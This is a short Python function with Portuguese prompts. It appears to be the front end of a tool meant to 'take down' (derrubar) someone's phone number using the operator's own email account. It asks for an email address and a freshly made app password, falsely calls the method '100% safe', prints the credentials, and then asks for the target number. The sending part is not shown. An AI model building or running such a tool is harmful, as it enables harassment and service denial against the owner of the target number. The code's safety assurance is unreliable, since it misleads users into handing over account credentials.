def conjunto_1():
        c = input('coloque o seu email: ')
        print('')
        print (''' Ative a verificaçao de duas etapas, apos isso, ative a opçao senha de apps, crie uma senha para o seu email. Agora coloque a senha.''')

        print ('')

        d = input('coloque a senha: ')

        print('')

        print ('''tudo pronto, a senha pode ser usada apenas para usar o seu email. Este método e 100% seguro! ''')

        print ('')
        print(f'seu email: {c}')
        print(f'sua senha de email: {d}')
        print('')
        a = input('coloque o numero q vc quer derrubar +55 (12) 12345-6789: ')

        return { 'email': c, 'senha': d, 'numero': a }